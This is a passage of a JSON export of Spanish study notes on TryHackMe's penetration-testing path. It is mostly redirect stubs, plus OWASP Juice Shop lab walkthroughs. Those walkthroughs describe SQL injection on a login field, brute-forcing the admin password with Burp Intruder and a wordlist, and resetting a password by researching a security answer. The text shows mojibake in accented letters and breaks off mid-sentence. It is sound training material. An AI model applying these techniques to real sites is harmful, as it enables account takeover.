    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 1. How The Web Works > 3. How Websites Work",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 3. How the Web Works -> 3. How Websites Work**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. How Websites Work",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/1-how-the-web-works/3-how-websites-work/0-how-websites-work/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/3. How Websites Work/0. How Websites Work.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 1. How The Web Works > 3. How Websites Work",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/3. How Websites Work/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/1-how-the-web-works/4-putting-it-all-together/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/4. Putting It All Together/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 1. How The Web Works > 4. Putting It All Together",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 3. How the Web Works -> 4. Putting it All Together**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Putting It All Together",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/1-how-the-web-works/4-putting-it-all-together/0-putting-it-all-together/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/4. Putting It All Together/0. Putting It All Together.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 1. How The Web Works > 4. Putting It All Together",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/4. Putting it All Together/0. Putting it All Together]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/4. Putting It All Together/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/1-how-the-web-works/2-http-in-detail/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/2. HTTP in Detail/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 1. How The Web Works > 2. HTTP in Detail",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 3. How the Web Works -> 2. HTTP in Detail**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. HTTP in Detail",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/1-how-the-web-works/2-http-in-detail/0-http-in-detail/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/2. HTTP in Detail/0. HTTP in Detail.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 1. How The Web Works > 2. HTTP in Detail",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/0. HTTP in Detail]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/2. HTTP in Detail/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. DNS in Detail",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/1-how-the-web-works/1-dns-in-detail/0-dns-in-detail/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/1. DNS in Detail/0. DNS in Detail.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 1. How The Web Works > 1. DNS in Detail",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/0. DNS in Detail]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/1. DNS in Detail/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/1-how-the-web-works/1-dns-in-detail/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/1. DNS in Detail/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 1. How The Web Works > 1. DNS in Detail",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 3. How the Web Works -> 1. DNS in Detail**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/8-intro-to-cross-site-scripting/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/8. Intro to Cross-site Scripting/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 8. Intro to Cross-site Scripting",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 8. Intro to Cross-site Scripting**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Intro to Cross-site Scripting",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/8-intro-to-cross-site-scripting/0-intro-to-cross-site-scripting/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/8. Intro to Cross-site Scripting/0. Intro to Cross-site Scripting.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 8. Intro to Cross-site Scripting",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/0. Intro to Cross-site Scripting]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/8. Intro to Cross-site Scripting/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/1-walking-an-application/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/1. Walking An Application/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 1. Walking An Application",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 1. Walking an Application**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Walking An Application",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/1-walking-an-application/0-walking-an-application/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/1. Walking An Application/0. Walking An Application.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 1. Walking An Application",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/1. Walking an Application/0. Walking an Application]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/1. Walking An Application/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/4-authentication-bypass/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/4. Authentication Bypass/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 4. Authentication Bypass",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 4. Authentication Bypass**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Authentication Bypass",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/4-authentication-bypass/0-authentication-bypass/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/4. Authentication Bypass/0. Authentication Bypass.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 4. Authentication Bypass",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/4. Authentication Bypass/0. Authentication Bypass]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/4. Authentication Bypass/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Command Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/10-command-injection/0-command-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/10. Command Injection/0. Command Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 10. Command Injection",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/10. Command Injection/0. Command Injection]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/10. Command Injection/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/10-command-injection/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/10. Command Injection/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 10. Command Injection",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 10. Command Injection**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/9-race-conditions/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/9. Race Conditions/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 9. Race Conditions",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 9. Race Conditions**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Race Conditions",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/9-race-conditions/0-race-conditions/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/9. Race Conditions/0. Race Conditions.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 9. Race Conditions",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/0. Race Conditions]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/9. Race Conditions/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/6-file-inclusion/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/6. File Inclusion/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 6. File Inclusion",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 6. File Inclusion**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. File Inclusion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/6-file-inclusion/0-file-inclusion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/6. File Inclusion/0. File Inclusion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 6. File Inclusion",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/6. File Inclusion/0. File Inclusion]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/6. File Inclusion/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/7-intro-to-ssrf/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/7. Intro to SSRF/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 7. Intro to SSRF",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 7. Intro to SSRF**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Intro to SSRF",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/7-intro-to-ssrf/0-intro-to-ssrf/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/7. Intro to SSRF/0. Intro to SSRF.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 7. Intro to SSRF",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/7. Intro to SSRF/0. Intro to SSRF]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/7. Intro to SSRF/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. IDOR",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/5-idor/0-idor/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/5. IDOR/0. IDOR.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 5. IDOR",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/5. IDOR/0. IDOR]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/5. IDOR/1. Redirecci√≥n]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redirecci√≥n",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/5-idor/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/5. IDOR/1. Redirecci√≥n.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 5. IDOR",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 5. IDOR**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Subdomain Enumeration",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/3-subdomain-enumeration/0-subdomain-enumeration/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/3. Subdomain Enumeration/0. Subdomain Enumeration.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 3. Subdomain Enumeration",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Subdomain Enumeration/0. Subdomain Enumeration]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/3. Subdomain Enumeration/1. Redirecci√≥n]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redirecci√≥n",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/3-subdomain-enumeration/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/3. Subdomain Enumeration/1. Redirecci√≥n.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 3. Subdomain Enumeration",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 3. Subdomain Enumeration**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/11-sql-injection/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/11. SQL Injection/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 11. SQL Injection",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 11. SQL Injection**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. SQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/11-sql-injection/0-sql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/11. SQL Injection/0. SQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 11. SQL Injection",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/0. SQL Injection]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/11. SQL Injection/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/2-content-discovery/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/2. Content Discovery/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 2. Content Discovery",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 2. Content Discovery**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Content Discovery",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/2-content-discovery/0-content-discovery/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/2. Content Discovery/0. Content Discovery.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking > 2. Content Discovery",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/0. Content Discovery]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/2. Content Discovery/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Inject the Juice",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/7-owasp-juice-shop/3-inject-the-juice/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/7. OWASP Juice Shop/3. Inject the Juice.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 7. OWASP Juice Shop",
    "content": "![[Pasted image 20251210122841.png]]\n\nEsta tarea se centrar√° en vulnerablidades de inyecci√≥n. Son bastante peligrosas ya que pueden causar p√©rdida de informaci√≥n o denegar el servicio, potencialmente. Identificar puntos de inyecci√≥n en una aplicaci√≥n web suele ser sencillo ya que la mayor√≠a de ellos devolver√°n un error. Hay muchos tipos de ataque de inyecci√≥n. Algunos son:\n\n| Ataque            | Descripci√≥n                                                                                                                                                                                                    |\n| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| SQL Injection     | Es cuando un atacante introduce una query maliciosa para recuperar o alterar informaci√≥n de una base de datos o incluso iniciar sesi√≥n en cuentas.                                                             |\n| Command Injection | Es cuando las aplicaciones web toman el input del usuario y lo ejecutan como comandos de sistema.                                                                                                              |\n| Email Injection   | Permite a los usuarios maliciosos mandar emails sin autorizaci√≥n previa del servidor de email. Esto ocurre cuando los atacantes a√±aden informaci√≥n extra a los campos que el servidor no maneja correctamente. |\n\nEn nuestro caso usaremos SQL Injection.\n\n------------------------------------------\n1. Inicia sesi√≥n en la cuenta de administrador.\n\t1. Vamos a Login.\n\t   ![[Pasted image 20251210140330.png]]\n\t2. Abrimos Burp Suite e interceptamos una petici√≥n de login.\n\t   ![[Pasted image 20251210140907.png]]\n\t3. Empezamos a hacer pruebas.\n\t\t1. Parece que el campo password no es inyectable.\n\t\t   ![[Pasted image 20251210141616.png]]\n\t\t2. El campo username por el contrario si que lo es.\n\t\t   ![[Pasted image 20251210141656.png]]\n\t\t3. Probamos a inyectar el usuario con el correo del admin.\n\t\t   ![[Pasted image 20251210142146.png]]\n\t\t   PArece que nos hemos autentificado.\n\t4. Lo probamos sin Burp Suite.\n\t   ![[Pasted image 20251210142218.png]]\n2. Inicia sesi√≥n en la cuenta de Bender.\n\t1. Buscamos la direcci√≥n de correo de Bender.\n\t   ![[Pasted image 20251210142348.png]]\n\t2. Realizamos el mismo proceso y obtenemos la flag.\n\t   ![[Pasted image 20251210142454.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. OWASP Juice Shop",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/7-owasp-juice-shop/0-owasp-juice-shop/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/7. OWASP Juice Shop/0. OWASP Juice Shop.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 7. OWASP Juice Shop",
    "content": "[[1. Open for Business]]\n[[2. Lets Go on an Adventure]]\n[[3. Inject the Juice]]\n[[4. Who Broke my Lock]]\n[[5. AH Dont Look]]\n[[6. Whos Flying this Thing]]\n[[7. Where did that Come From]]\n[[8. Exploration]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Who Broke my Lock",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/7-owasp-juice-shop/4-who-broke-my-lock/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/7. OWASP Juice Shop/4. Who Broke my Lock.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 7. OWASP Juice Shop",
    "content": "![[Pasted image 20251210144317.png]]\n\nEn esta tarea veremos c√≥mo explotar una autentificaci√≥n a trav√©s de diferentes fallos. Cuando hablamos de fallos/debilidades en la autentificaci√≥n, incluimos mecanismos que son vulnerables a la manipulaci√≥n. Estos mecanismos, listados debajo, son los que explotaremos.\n\n- Forgotten Password Pages\n- Broken Authentication\n\n----------------------------------------------\n1. Bruteforcea la contrase√±a del administrador.\n\t1. Para ello lo primero que tenemos que hacer es ir a Burp Suite y capturar una petici√≥n de inicio de sesi√≥n.\n\t   ![[Pasted image 20251210145335.png]]\n\t2. La mandamos al intruder y preparamos la petici√≥n para sustituir las contrase√±as con el email del admin.\n\t   ![[Pasted image 20251210145442.png]]\n\t3. Configuramos el diccionario de contrase√±as (`/usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt`).\n\t   ![[Pasted image 20251210145644.png]]\n\t4. Empezamos el ataque y esperamos resultados, ordenando por c√≥digo de respuesta.\n\t   ![[Pasted image 20251210150131.png]]\n\t5. Obtenemos la flag.\n\t   ![[Pasted image 20251210150250.png]]\n2. Resetea la contrase√±a de Jim.\n\t1. Si nos metemos en la opci√≥n de \"Forgot your Password?\" podemos ver que la pregunta de seguridad es el nombre del medio de su hermano.\n\t   ![[Pasted image 20251210150749.png]]\n\t2. Podemos recordar que Jim hac√≠a referencia a Star Trek. Si buscamos Jim Star Trek, nos sale:\n\t   ![[Pasted image 20251210150455.png]]\n\t3. Si nos metemos en la Wikipedia podemos ver que tiene un hermano.\n\t   ![[Pasted image 20251210150535.png]]\n\t4. Si ponemos \"Samuel\", generamos una contrase√±a segura y le damos a cambiar, podemos cambiarla y obtener la flag.\n\t   ![[Pasted image 20251210150938.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Exploration",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/7-owasp-juice-shop/8-exploration/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/7. OWASP Juice Shop/8. Exploration.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 7. OWASP Juice Shop",
    "content": "![[Pasted image 20251212123331.png]]\n\nSi deseas afrontar algunos retos m√°s dif√≠ciles puedes mirar la secci√≥n `/#/score-board/` en Juice Shop. Ah√≠ podr√°s ver las tareas que has completado y ordenadas por dificultad.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Whos Flying this Thing",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/7-owasp-juice-shop/6-whos-flying-this-thing/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/7. OWASP Juice Shop/6. Whos Flying this Thing.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 7. OWASP Juice Shop",
    "content": "![[Pasted image 20251212144150.png]]\n\nLos sistemas modernos permiten a m√∫ltiples usuarios tener acceso a diferentes p√°ginas. Los administradores usan com√∫nmente p√°ginas de administraci√≥n para editas, a√±adir y eliminar contenido de la web. Puedes usarlas cuando est√°s construyendo un sitio web con herramientas como Weebly o Wix.\n\nCuando se encuentran exploits de Croken Access Control, pueden categorizarse en uno de estos dos tipos:\n\n| Tipo                                | Descripci√≥n                                                                                                                                |\n| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |\n| **Horizontal** Privilege Escalation | Ocurre cuando un usuario puede realizar una acci√≥n o acceder a informaci√≥n reservada para un usuario con el mismo nivel de privilegios.    |\n| **Vertical** Privilege Escalation   | Ocurre cuando un usuario puede realizar una acci√≥n o acceder a informaci√≥n reservada para un 